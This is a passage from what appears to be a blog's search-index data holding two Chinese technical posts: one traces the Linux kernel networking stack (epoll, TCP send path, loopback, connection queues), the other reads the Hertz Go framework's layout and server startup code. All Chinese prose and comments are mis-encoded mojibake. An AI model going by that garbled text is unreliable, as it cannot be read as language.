\u0026amp;pwq-\u0026gt;wait); } // net/ipv4/af_inet.c const struct proto_ops inet_stream_ops = { .poll\t= tcp_poll, } // è¿™ä¸ªinetsw_arrayçš„æ‰€æœ‰å…ƒç´ åœ¨inet_initçš„æ—¶å€™æ’å…¥inetswé“¾è¡¨ static struct inet_protosw inetsw_array[] = { { .type = SOCK_STREAM, .protocol = IPPROTO_TCP, .prot = \u0026amp;tcp_prot, .ops = \u0026amp;inet_stream_ops, .flags = INET_PROTOSW_PERMANENT | INET_PROTOSW_ICSK, }, } // net/ipv4/tcp.c __poll_t tcp_poll(struct file *file, struct socket *sock, poll_table *wait) sock_poll_wait(file, sock, wait); } // include/net/sock.h static inline void sock_poll_wait(struct file *filp, struct socket *sock, poll_table *p) { poll_wait(filp, \u0026amp;sock-\u0026gt;wq.wait, p); } // include/linux/poll.h static inline void init_poll_funcptr(poll_table *pt, poll_queue_proc qproc) { pt-\u0026gt;_qproc = qproc; pt-\u0026gt;_key = ~(__poll_t)0; /* all events enabled */ } static inline void poll_wait(struct file * filp, wait_queue_head_t * wait_address, poll_table *p) { if (p \u0026amp;\u0026amp; p-\u0026gt;_qproc \u0026amp;\u0026amp; wait_address) p-\u0026gt;_qproc(filp, wait_address, p); } // include/linux/wait.h // init_waitqueue_func_entryå°±æ˜¯æŒ‡å®šfuncä¸æŒ‡å®šprivate // init_waitqueue_entryå°±æ˜¯é»˜è®¤å½“å‰è¿›ç¨‹default_wake_function static inline void init_waitqueue_func_entry(struct wait_queue_entry *wq_entry, wait_queue_func_t func) { wq_entry-\u0026gt;flags\t= 0; wq_entry-\u0026gt;private\t= NULL; wq_entry-\u0026gt;func\t= func; } epoll_waitä»epoll-\u0026gt;rdllistä¸­å–å°±ç»ªsocketï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»ºç­‰å¾…äº‹ä»¶æ·»åŠ åˆ°epoll-\u0026gt;wqï¼Œç„¶åepoll_waitè¿›ç¨‹é˜»å¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // include/linux/wait.h static inline void init_waitqueue_entry(struct wait_queue_entry *wq_entry, struct task_struct *p) { wq_entry-\u0026gt;flags\t= 0; wq_entry-\u0026gt;private\t= p; wq_entry-\u0026gt;func\t= default_wake_function; } static int ep_poll_callback(wait_queue_entry_t *wait, unsigned mode, int sync, void *key) { // è·å–waitå¯¹åº”çš„epitemå¹¶é€šè¿‡itemæ‰¾åˆ°epå¯¹è±¡ waitæ˜¯ä¹‹å‰æ·»åŠ åˆ°socket wqä¸Šçš„entry struct epitem *epi = ep_item_from_wait(wait); struct eventpoll *ep = epi-\u0026gt;ep; // epitemæ·»åŠ åˆ°å°±ç»ªé˜Ÿåˆ— list_add_tail_lockless(\u0026amp;epi-\u0026gt;rdllink, \u0026amp;ep-\u0026gt;rdllist) // æŸ¥çœ‹ep-\u0026gt;wqæ˜¯å¦æœ‰ç¬¦åˆæ¡ä»¶çš„entryå¹¶å”¤é†’ ä¹Ÿå°±æ˜¯epoll_wait if (waitqueue_active(\u0026amp;ep-\u0026gt;wq)) { ... // åç»­è°ƒç”¨default_wake_functionå”¤é†’ç­‰å¾…çš„è¿›ç¨‹ wake_up(\u0026amp;ep-\u0026gt;wq); } } å†…æ ¸å‘åŒ… inet_sendmsg\nsk-\u0026gt;sock_prot-\u0026gt;sendmsg\ntcp_sendmsg\nicsk-\u0026gt;icsk_af_ops-\u0026gt;queue_xmit(xkb)\nip_queue_xmit\nip_local_out\nip_finish_output2\ndst_neigh_output\nneigh_hh_output\ndev_queue_xmit\ndev_hard_start_xmit\nigb_xmit_frame\nigb_xmit_frame_ring\nnet_rx_action\nigb_poll\nigb_clean_tx_irq\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 // net/ipv4/tcp_ipv4.c const struct inet_connection_sock_af_ops ipv4_specific = { .queue_xmit\t= ip_queue_xmit, .send_check\t= tcp_v4_send_check, .rebuild_header\t= inet_sk_rebuild_header, .sk_rx_dst_set\t= inet_sk_rx_dst_set, .conn_request\t= tcp_v4_conn_request, .syn_recv_sock\t= tcp_v4_syn_recv_sock, .net_header_len\t= sizeof(struct iphdr), .setsockopt\t= ip_setsockopt, .getsockopt\t= ip_getsockopt, .addr2sockaddr\t= inet_csk_addr2sockaddr, .sockaddr_len\t= sizeof(struct sockaddr_in), .mtu_reduced\t= tcp_v4_mtu_reduced, }; // net/ipv4/ip_output.c // è¿™é‡Œæ˜¯å‡ºçš„é“¾ ä¹Ÿæ˜¯iptables localout å’Œpostroutingé“¾ int __ip_local_out(struct net *net, struct sock *sk, struct sk_buff *skb) { struct iphdr *iph = ip_hdr(skb); iph-\u0026gt;tot_len = htons(skb-\u0026gt;len); ip_send_check(iph); ... skb-\u0026gt;protocol = htons(ETH_P_IP); return nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT, net, sk, skb, NULL, skb_dst(skb)-\u0026gt;dev, dst_output); } int ip_output(struct net *net, struct sock *sk, struct sk_buff *skb) { struct net_device *dev = skb_dst(skb)-\u0026gt;dev, *indev = skb-\u0026gt;dev; IP_UPD_PO_STATS(net, IPSTATS_MIB_OUT, skb-\u0026gt;len); skb-\u0026gt;dev = dev; skb-\u0026gt;protocol = htons(ETH_P_IP); return NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING, net, sk, skb, indev, dev, ip_finish_output, !(IPCB(skb)-\u0026gt;flags \u0026amp; IPSKB_REROUTED)); } lo loä¹Ÿæ˜¯æ­£å¸¸pathèµ°ä¸€éç½‘ç»œæ ˆ\nä¸æ­£å¸¸devç›¸æ¯”å”¯ä¸€ä¸åŒçš„å°±æ˜¯æ”¶åˆ°æ•°æ®ä¸å†ç¡¬ä¸­æ–­è€Œæ˜¯ç›´æ¥è½¯ä¸­æ–­æ”¶åŒ…\næ­£å¸¸è®¾å¤‡MTU1500 loæ˜¯è™šæ‹Ÿè®¾å¤‡MTU65536 å¯ä»¥å‡å°‘åˆ†åŒ…å‡å°‘èµ„æºæ¶ˆè€—\n1 ip route list table local è·¯ç”±è¡¨å…¶å®æœ¬è´¨å°±æ˜¯æ‰¾åˆ°ç½‘ç»œè®¾å¤‡\nfib_lookupæŸ¥æ‰¾è·¯ç”±è¡¨è®¾ç½®dev è¾“å…¥åˆ°lo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 // drivers/net/loopback.c static netdev_tx_t loopback_xmit(struct sk_buff *skb, struct net_device *dev) { int len; skb_tx_timestamp(skb); /* do not fool net_timestamp_check() with various clock bases */ skb_clear_tstamp(skb); // å‰¥ç¦»åŸsocketè”ç³» skb_orphan(skb); /* Before queueing this packet to __netif_rx(), * make sure dst is refcounted. */ skb_dst_force(skb); skb-\u0026gt;protocol = eth_type_trans(skb, dev); len = skb-\u0026gt;len; if (likely(__netif_rx(skb) == NET_RX_SUCCESS)) dev_lstats_add(dev, len); return NETDEV_TX_OK; } // net/core/dev.c __netif_rx-\u0026gt;netif_rx_internal-\u0026gt;enqueue_to_backlog // queue an skb to a per CPU backlog queue // pathå¯èƒ½æœ‰ç‚¹å¥‡æ€ª å…¶å®æ˜¯å¯¹çš„ å…ˆå…¥é˜Ÿ æ»¡äº†å†å¼€è½¯ä¸­æ–­æ¥æ¶ˆè´¹ static int enqueue_to_backlog(struct sk_buff *skb, int cpu, unsigned int *qtail) { ... sd = \u0026amp;per_cpu(softnet_data, cpu); ... qlen = skb_queue_len(\u0026amp;sd-\u0026gt;input_pkt_queue); if (qlen \u0026lt;= netdev_max_backlog \u0026amp;\u0026amp; !skb_flow_limit(skb, qlen)) { if (qlen) { enqueue: __skb_queue_tail(\u0026amp;sd-\u0026gt;input_pkt_queue, skb); input_queue_tail_incr_save(sd, qtail); rps_unlock_irq_restore(sd, \u0026amp;flags); return NET_RX_SUCCESS; } /* Schedule NAPI for backlog device * We can use non atomic operation since we own the queue lock */ if (!__test_and_set_bit(NAPI_STATE_SCHED, \u0026amp;sd-\u0026gt;backlog.state)) napi_schedule_rps(sd); goto enqueue; } ... } // net/core/dev.c static int __init net_dev_init(void) { for_each_possible_cpu(i) { sd-\u0026gt;backlog.poll = process_backlog; } } //input_pkt_queue-\u0026gt;skb1-\u0026gt;skb2-\u0026gt;skb3 //process_queue // ---\u0026gt; //input_pkt_queue //process_queue-\u0026gt;skb1-\u0026gt;skb2-\u0026gt;skb3 static int process_backlog(struct napi_struct *napi, int quota) { while ((skb = __skb_dequeue(\u0026amp;sd-\u0026gt;process_queue))) { rcu_read_lock(); __netif_receive_skb(skb); rcu_read_unlock(); input_queue_head_incr(sd); if (++work \u0026gt;= quota) return work; } skb_queue_splice_tail_init(\u0026amp;sd-\u0026gt;input_pkt_queue, \u0026amp;sd-\u0026gt;process_queue); } tcp è¿æ¥å»ºç«‹ listenåˆå§‹åŒ–å…¨è¿æ¥é˜Ÿåˆ—å’ŒåŠè¿æ¥é˜Ÿåˆ—(ä¸¤è€…é•¿åº¦æœ‰é™)\nacceptä»å…¨è¿æ¥é˜Ÿåˆ—ä¸Šæ‘˜ä¸‹\nconnectå‘é€synåŒ… serverå‡å¦‚åŠè¿æ¥é˜Ÿåˆ—å·²æ»¡åˆ™drop å¦åˆ™å‘é€synackå¹¶åŠ å…¥åŠè¿æ¥é˜Ÿåˆ—\næ”¶åˆ°youngackï¼ŒåŠ å…¥å…¨è¿æ¥å·²æ»¡åˆ™drop\néƒ½æ˜¯å…ˆæ”¹å˜çŠ¶æ€å†å‘åŒ…çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 // include/net/request_sock.h struct request_sock_queue { spinlock_t\trskq_lock; u8\trskq_defer_accept; u32\tsynflood_warned; atomic_t\tqlen; atomic_t\tyoung; // å…¨è¿æ¥é˜Ÿåˆ— struct request_sock\t*rskq_accept_head; struct request_sock\t*rskq_accept_tail; // åŠè¿æ¥é˜Ÿåˆ— fastopenå…è®¸æœ€åä¸€ä¸ªackä¸è¯·æ±‚ä¿¡æ¯åŒæ—¶å‘é€ struct fastopen_queue\tfastopenq; /* Check max_qlen != 0 to determine * if TFO is enabled. */ }; //file: net/ipv4/tcp_ipv4.c int tcp_v4_conn_request(struct sock *sk, struct sk_buff *skb) { //çœ‹çœ‹åŠè¿æ¥é˜Ÿåˆ—æ˜¯å¦æ»¡äº† if (inet_csk_reqsk_queue_is_full(sk) \u0026amp;\u0026amp; !isn) { want_cookie = tcp_syn_flood_action(sk, skb, \u0026#34;TCP\u0026#34;); if (!want_cookie) goto drop; } //åœ¨å…¨è¿æ¥é˜Ÿåˆ—æ»¡çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæœ‰ young_ackï¼Œé‚£ä¹ˆç›´æ¥ä¸¢ if (sk_acceptq_is_full(sk) \u0026amp;\u0026amp; inet_csk_reqsk_queue_young(sk) \u0026gt; 1) { NET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENOVERFLOWS); goto drop; } ... //åˆ†é… request_sock å†…æ ¸å¯¹è±¡ req = inet_reqsk_alloc(\u0026amp;tcp_request_sock_ops); //æ„é€  syn+ack åŒ… skb_synack = tcp_make_synack(sk, dst, req, fastopen_cookie_present(\u0026amp;valid_foc) ? \u0026amp;valid_foc : NULL); if (likely(!do_fastopen)) { //å‘é€ syn + ack å“åº” err = ip_build_and_send_pkt(skb_synack, sk, ireq-\u0026gt;loc_addr, ireq-\u0026gt;rmt_addr, ireq-\u0026gt;opt); //æ·»åŠ åˆ°åŠè¿æ¥é˜Ÿåˆ—ï¼Œå¹¶å¼€å¯è®¡æ—¶å™¨ inet_csk_reqsk_queue_hash_add(sk, req, TCP_TIMEOUT_INIT); }else ... } å†…å­˜æ¶ˆè€— ESTABLISHED 3.3k\nTIME_WAIT 0.3k\n4G 100w\næœ€å¤§tcpè¿æ¥æ•° 1 2 3 4 5 6 7 8 æœ€å¤§æ–‡ä»¶ä¸Šé™ # è¿›ç¨‹çº§åˆ« fs.nropen æ‰€æœ‰ç”¨æˆ· nofile é’ˆå¯¹ä¸åŒç”¨æˆ· # ç³»ç»Ÿçº§åˆ« fs.file-max\tæ•´ä¸ªç³»ç»Ÿæœ€å¤§æ–‡ä»¶ # saddrã€sportã€daddrã€dportç†è®ºå·¨å¤§ å®¹å™¨ç½‘ç»œ è¿›ç¨‹nsproxy\nCLONE_NEWNET\nbridge èµ° iptables 135æ‰¾natè¡¨ä»ä¸€ä¸ªç«¯å£é€åˆ°å¦ä¸€ä¸ªç«¯å£\n1 2 skb-\u0026gt;dev = to-\u0026gt;dev; dev_queue_xmit(skb); ","description":"","id":7,"section":"posts","tags":["network"],"title":"kernel/netå†è´¯ç©¿ï¼šdev-ip-tcp stackã€epollã€netnsã€iptables etc...","uri":"https://ruokeqx.gitee.io/posts/kernel_net_again/"},{"content":"åˆæ­¥é˜…è¯»é¡¹ç›®ä»£ç åå‘ç°ä¸èƒ½ç”¨ç®€å•çš„å•åˆ†æ”¯æµæ¥æ ‡è¯†ç¨‹åºæ§åˆ¶æµ(å› ä¸ºnetworkéƒ¨åˆ†æœ‰ä¸¤å¥—å¹¶è¡Œå®ç°) ç”¨ç›®å½•çš„æ–¹å¼æ¥è§£é‡Šæ›´åŠ ç›´è§‚ä¸€äº›\nç›®å½•å¯ä»¥å¾ˆæ¸…æ™°åœ°çœ‹å‡ºç»“æ„è®¾è®¡,pkgæ˜¯ä¸»è¦éƒ¨åˆ†\nappæä¾›äº†clientå’Œserverå¼•æ“\ncommonæä¾›åŸºç¡€ç¨‹åºæœåŠ¡\nnetworkæä¾›ç½‘ç»œ åŒ…æ‹¬go netåŒ…å’Œnetpoll\nprotocolæä¾›protocolSuiteåŒ…æ‹¬http/1.1å’Œh2\nrouteåˆ™æä¾›è·¯ç”±\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 pkg â”œâ”€â”€ app â”‚Â â”œâ”€â”€ client â”‚Â â”‚Â â”œâ”€â”€ client.go â”‚Â â”‚Â â”œâ”€â”€ client_test.go â”‚Â â”‚Â â”œâ”€â”€ middleware.go â”‚Â â”‚Â â”œâ”€â”€ middleware_test.go â”‚Â â”‚Â â”œâ”€â”€ option.go â”‚Â â”‚Â â””â”€â”€ option_test.go â”‚Â â”œâ”€â”€ context.go â”‚Â â”œâ”€â”€ context_test.go â”‚Â â”œâ”€â”€ fs.go â”‚Â â”œâ”€â”€ fs_test.go â”‚Â â”œâ”€â”€ middlewares â”‚Â â”‚Â â””â”€â”€ server â”‚Â â”‚Â â”œâ”€â”€ basic_auth â”‚Â â”‚Â â”‚Â â”œâ”€â”€ basic_auth.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ basic_auth_test.go â”‚Â â”‚Â â”‚Â â””â”€â”€ doc.go â”‚Â â”‚Â â””â”€â”€ recovery â”‚Â â”‚Â â”œâ”€â”€ recovery.go â”‚Â â”‚Â â””â”€â”€ recovery_test.go â”‚Â â””â”€â”€ server â”‚Â â”œâ”€â”€ binding â”‚Â â”‚Â â”œâ”€â”€ binding.go â”‚Â â”‚Â â”œâ”€â”€ binding_test.go â”‚Â â”‚Â â””â”€â”€ request.go â”‚Â â”œâ”€â”€ hertz.go â”‚Â â”œâ”€â”€ hertz_test.go â”‚Â â”œâ”€â”€ option.go â”‚Â â”œâ”€â”€ option_test.go â”‚Â â””â”€â”€ render â”‚Â â”œâ”€â”€ data.go â”‚Â â”œâ”€â”€ doc.go â”‚Â â”œâ”€â”€ html.go â”‚Â â”œâ”€â”€ json.go â”‚Â â”œâ”€â”€ json_test.go â”‚Â â”œâ”€â”€ protobuf.go â”‚Â â”œâ”€â”€ render.go â”‚Â â”œâ”€â”€ render_test.go â”‚Â â”œâ”€â”€ text.go â”‚Â â””â”€â”€ xml.go â”œâ”€â”€ common â”‚Â â”œâ”€â”€ adaptor â”‚Â â”‚Â â”œâ”€â”€ request.go â”‚Â â”‚Â â”œâ”€â”€ request_test.go â”‚Â â”‚Â â””â”€â”€ response.go â”‚Â â”œâ”€â”€ bytebufferpool â”‚Â â”‚Â â”œâ”€â”€ bytebuffer.go â”‚Â â”‚Â â”œâ”€â”€ bytebuffer_test.go â”‚Â â”‚Â â”œâ”€â”€ doc.go â”‚Â â”‚Â â”œâ”€â”€ pool.go â”‚Â â”‚Â â””â”€â”€ pool_test.go â”‚Â â”œâ”€â”€ compress â”‚Â â”‚Â â”œâ”€â”€ compress.go â”‚Â â”‚Â â”œâ”€â”€ compress_test.go â”‚Â â”‚Â â””â”€â”€ doc.go â”‚Â â”œâ”€â”€ config â”‚Â â”‚Â â”œâ”€â”€ client_option.go â”‚Â â”‚Â â”œâ”€â”€ option.go â”‚Â â”‚Â â”œâ”€â”€ request_option.go â”‚Â â”‚Â â””â”€â”€ request_option_test.go â”‚Â â”œâ”€â”€ errors â”‚Â â”‚Â â”œâ”€â”€ errors.go â”‚Â â”‚Â â””â”€â”€ errors_test.go â”‚Â â”œâ”€â”€ hlog â”‚Â â”‚Â â”œâ”€â”€ default.go â”‚Â â”‚Â â””â”€â”€ log.go â”‚Â â”œâ”€â”€ stackless â”‚Â â”‚Â â”œâ”€â”€ doc.go â”‚Â â”‚Â â”œâ”€â”€ func.go â”‚Â â”‚Â â”œâ”€â”€ func_test.go â”‚Â â”‚Â â”œâ”€â”€ func_timing_test.go â”‚Â â”‚Â â”œâ”€â”€ writer.go â”‚Â â”‚Â â””â”€â”€ writer_test.go â”‚Â â”œâ”€â”€ test â”‚Â â”‚Â â”œâ”€â”€ assert â”‚Â â”‚Â â”‚Â â””â”€â”€ assert.go â”‚Â â”‚Â â””â”€â”€ mock â”‚Â â”‚Â â”œâ”€â”€ body_data.go â”‚Â â”‚Â â”œâ”€â”€ body_data_test.go â”‚Â â”‚Â â”œâ”€â”€ network.go â”‚Â â”‚Â â””â”€â”€ reader.go â”‚Â â”œâ”€â”€ testdata â”‚Â â”‚Â â”œâ”€â”€ conf â”‚Â â”‚Â â”‚Â â””â”€â”€ p_s_m.yaml â”‚Â â”‚Â â”œâ”€â”€ proto â”‚Â â”‚Â â”‚Â â”œâ”€â”€ test.pb.go â”‚Â â”‚Â â”‚Â â””â”€â”€ test.proto â”‚Â â”‚Â â”œâ”€â”€ template â”‚Â â”‚Â â”‚Â â”œâ”€â”€ htmltemplate.html â”‚Â â”‚Â â”‚Â â””â”€â”€ index.tmpl â”‚Â â”‚Â â”œâ”€â”€ test.png â”‚Â â”‚Â â””â”€â”€ test.txt â”‚Â â”œâ”€â”€ timer â”‚Â â”‚Â â”œâ”€â”€ doc.go â”‚Â â”‚Â â”œâ”€â”€ timer.go â”‚Â â”‚Â â””â”€â”€ timer_test.go â”‚Â â”œâ”€â”€ tracer â”‚Â â”‚Â â”œâ”€â”€ stats â”‚Â â”‚Â â”‚Â â”œâ”€â”€ event.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ event_test.go â”‚Â â”‚Â â”‚Â â””â”€â”€ status.go â”‚Â â”‚Â â”œâ”€â”€ traceinfo â”‚Â â”‚Â â”‚Â â”œâ”€â”€ httpstats.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ interface.go â”‚Â â”‚Â â”‚Â â””â”€â”€ traceinfo.go â”‚Â â”‚Â â””â”€â”€ tracer.go â”‚Â â”œâ”€â”€ ut â”‚Â â”‚Â â”œâ”€â”€ request.go â”‚Â â”‚Â â”œâ”€â”€ request_test.go â”‚Â â”‚Â â”œâ”€â”€ response.go â”‚Â â”‚Â â””â”€â”€ response_test.go â”‚Â â””â”€â”€ utils â”‚Â â”œâ”€â”€ bufpool.go â”‚Â â”œâ”€â”€ chunk.go â”‚Â â”œâ”€â”€ chunk_test.go â”‚Â â”œâ”€â”€ ioutil.go â”‚Â â”œâ”€â”€ ioutil_test.go â”‚Â â”œâ”€â”€ network.go â”‚Â â”œâ”€â”€ path.go â”‚Â â”œâ”€â”€ path_test.go â”‚Â â”œâ”€â”€ utils.go â”‚Â â””â”€â”€ utils_test.go â”œâ”€â”€ network â”‚Â â”œâ”€â”€ connection.go â”‚Â â”œâ”€â”€ dialer â”‚Â â”‚Â â”œâ”€â”€ default.go â”‚Â â”‚Â â”œâ”€â”€ default_windows.go â”‚Â â”‚Â â””â”€â”€ dialer.go â”‚Â â”œâ”€â”€ netpoll â”‚Â â”‚Â â”œâ”€â”€ connection.go â”‚Â â”‚Â â”œâ”€â”€ dial.go â”‚Â â”‚Â â””â”€â”€ transport.go â”‚Â â”œâ”€â”€ standard â”‚Â â”‚Â â”œâ”€â”€ buffer.go â”‚Â â”‚Â â”œâ”€â”€ connection.go â”‚Â â”‚Â â”œâ”€â”€ connection_test.go â”‚Â â”‚Â â”œâ”€â”€ dial.go â”‚Â â”‚Â â””â”€â”€ transport.go â”‚Â â”œâ”€â”€ transport.go â”‚Â â”œâ”€â”€ utils.go â”‚Â â”œâ”€â”€ utils_test.go â”‚Â â”œâ”€â”€ writer.go â”‚Â â””â”€â”€ writer_test.go â”œâ”€â”€ protocol â”‚Â â”œâ”€â”€ args.go â”‚Â â”œâ”€â”€ args_test.go â”‚Â â”œâ”€â”€ client â”‚Â â”‚Â â””â”€â”€ client.go â”‚Â â”œâ”€â”€ consts â”‚Â â”‚Â â”œâ”€â”€ default.go â”‚Â â”‚Â â”œâ”€â”€ fs.go â”‚Â â”‚Â â”œâ”€â”€ headers.go â”‚Â â”‚Â â”œâ”€â”€ http2.go â”‚Â â”‚Â â”œâ”€â”€ methods.go â”‚Â â”‚Â â””â”€â”€ status.go â”‚Â â”œâ”€â”€ cookie.go â”‚Â â”œâ”€â”€ cookie_test.go â”‚Â â”œâ”€â”€ doc.go â”‚Â â”œâ”€â”€ header.go â”‚Â â”œâ”€â”€ header_test.go â”‚Â â”œâ”€â”€ header_timing_test.go â”‚Â â”œâ”€â”€ http1 â”‚Â â”‚Â â”œâ”€â”€ client.go â”‚Â â”‚Â â”œâ”€â”€ client_test.go â”‚Â â”‚Â â”œâ”€â”€ ext â”‚Â â”‚Â â”‚Â â”œâ”€â”€ common.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ common_test.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ error.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ headerscanner.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ headerscanner_test.go â”‚Â â”‚Â â”‚Â â””â”€â”€ stream.go â”‚Â â”‚Â â”œâ”€â”€ factory â”‚Â â”‚Â â”‚Â â”œâ”€â”€ client.go â”‚Â â”‚Â â”‚Â â””â”€â”€ server.go â”‚Â â”‚Â â”œâ”€â”€ proxy â”‚Â â”‚Â â”‚Â â””â”€â”€ proxy.go â”‚Â â”‚Â â”œâ”€â”€ req â”‚Â â”‚Â â”‚Â â”œâ”€â”€ header.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ header_test.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ request.go â”‚Â â”‚Â â”‚Â â””â”€â”€ request_test.go â”‚Â â”‚Â â”œâ”€â”€ resp â”‚Â â”‚Â â”‚Â â”œâ”€â”€ header.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ header_test.go â”‚Â â”‚Â â”‚Â â”œâ”€â”€ response.go â”‚Â â”‚Â â”‚Â â””â”€â”€ response_test.go â”‚Â â”‚Â â””â”€â”€ server.go â”‚Â â”œâ”€â”€ multipart.go â”‚Â â”œâ”€â”€ multipart_test.go â”‚Â â”œâ”€â”€ request.go â”‚Â â”œâ”€â”€ request_test.go â”‚Â â”œâ”€â”€ response.go â”‚Â â”œâ”€â”€ response_test.go â”‚Â â”œâ”€â”€ server.go â”‚Â â”œâ”€â”€ suite â”‚Â â”‚Â â”œâ”€â”€ client.go â”‚Â â”‚Â â””â”€â”€ server.go â”‚Â â”œâ”€â”€ uri.go â”‚Â â”œâ”€â”€ uri_test.go â”‚Â â”œâ”€â”€ uri_timing_test.go â”‚Â â”œâ”€â”€ uri_unix.go â”‚Â â””â”€â”€ uri_windows.go â””â”€â”€ route â”œâ”€â”€ consts â”‚Â â””â”€â”€ const.go â”œâ”€â”€ default.go â”œâ”€â”€ default_windows.go â”œâ”€â”€ engine.go â”œâ”€â”€ engine_test.go â”œâ”€â”€ param â”‚Â â””â”€â”€ param.go â”œâ”€â”€ routergroup.go â”œâ”€â”€ routergroup_test.go â”œâ”€â”€ routes_test.go â”œâ”€â”€ routes_timing_test.go â”œâ”€â”€ tree.go â””â”€â”€ tree_test.go 47 directories, 171 files ç½‘ç»œåº“é€‰æ‹©é—®é¢˜:\nNewè°ƒç”¨çš„pkg/route/engine.goä¸­NewEngineæŒ‡å®štransportä¸ºdefaultTransporter(opt)\ndefaultTransporteræ˜¯å¸¸é‡standard.NewTransporter å›ºé»˜è®¤æœªä½¿ç”¨netpoll\nå½“éwindowså¹³å°ç¼–è¯‘æ—¶ä¼šä¿®æ”¹å‚æ•°ä¸ºdefaultTransporter = netpoll.NewTransporter(è§default.go) æ­¤æ—¶ä½¿ç”¨netpoll\nå½“ç„¶å¯ä»¥é€šè¿‡é…ç½®é¡¹é…ç½®\n1 2 server.New(server.WithTransport(standard.NewTransporter)) server.New(server.WithTransport(netpoll.NewTransporter)) server/hertz.goä¸€å…±ä¸‰ä¸ªæ¥å£\nNewæ ¹æ®Optionåˆ›å»ºä¸€ä¸ªserver Defaultåœ¨Newçš„åŸºç¡€ä¸Šæ·»åŠ äº†Recovery Spinåœ¨exampleä¸­å¯ä»¥çœ‹åˆ°ä½¿ç”¨,è¿è¡Œserverå¹¶æ ¹æ®ä¿¡å·é€‰æ‹©Closeæˆ–è€…ä¼˜é›…Shutdown 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // New creates a hertz instance without any default config. func New(opts ...config.Option) *Hertz { options := config.NewOptions(opts) h := \u0026amp;Hertz{ Engine: route.NewEngine(options), } return h } // Default creates a hertz instance with default middlewares. func Default(opts ...config.Option) *Hertz { h := New(opts...) h.Use(recovery.Recovery()) return h } // Spin runs the server until catching os.Signal. // SIGTERM triggers immediately close. // SIGHUP|SIGINT triggers graceful shutdown. func (h *Hertz) Spin() { errCh := make(chan error) go func() { errCh \u0026lt;- h.Run() }() if err := waitSignal(errCh); err != nil { hlog.Errorf(\u0026#34;HERTZ: Receive close signal: error=%v\u0026#34;, err) if err := h.Engine.Close(); err != nil { hlog.Errorf(\u0026#34;HERTZ: Close error=%v\u0026#34;, err) } return } hlog.Infof(\u0026#34;HERTZ: Begin graceful shutdown, wait at most num=%d seconds...\u0026#34;, h.GetOptions().ExitWaitTimeout/time.Second) ctx, cancel := context.WithTimeout(context.Background(), h.GetOptions().ExitWaitTimeout) defer cancel() if err := h.Shutdown(ctx); err != nil { hlog.Errorf(\u0026#34;HERTZ: Shutdown error=%v\u0026#34;, err) } } ä»Newå¼€å§‹,è®¾ç½®options,ç„¶ååˆå§‹åŒ–Engine\n1 2 3 4 5 6 7 8 // New creates a hertz instance without any default config. func New(opts ...config.Option) *Hertz { options := config.NewOptions(opts) h := \u0026amp;Hertz{ Engine: route.NewEngine(options), } return h } NewEngineè¿›è¡Œå‚æ•°åˆå§‹åŒ– åŒ…æ‹¬RouterGroup transport RequestContext_pool protocolSuiteç­‰\nå…¶ä¸­ defaultTransporter æ˜¯å¸¸é‡ standard.NewTransporter protocolSuiteæ˜¯æ”¯æŒçš„åè®®,å¯ä»¥é€šè¿‡engine.AddProtocolæ·»åŠ ,åç»­ä¼šå°†æ”¯æŒçš„åè®®serveæ¥å£æ”¾åˆ°protocolServersä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 func NewEngine(opt *config.Options) *Engine { engine := \u0026amp;Engine{ trees: make(MethodTrees, 0, 9), RouterGroup: RouterGroup{ Handlers: nil, basePath: \u0026#34;/\u0026#34;, root: true, }, transport: defaultTransporter(opt), tracerCtl: \u0026amp;internalStats.Controller{}, protocolServers: make(map[string]protocol.Server), enableTrace: true, options: opt, } engine.RouterGroup.engine = engine traceLevel := initTrace(engine) // prepare RequestContext pool engine.ctxPool.New = func() interface{} { ctx := engine.allocateContext() if engine.enableTrace { ti := traceinfo.NewTraceInfo() ti.Stats().SetLevel(traceLevel) ctx.SetTraceInfo(ti) } return ctx } // Init protocolSuite engine.protocolSuite = suite.New() return engine } 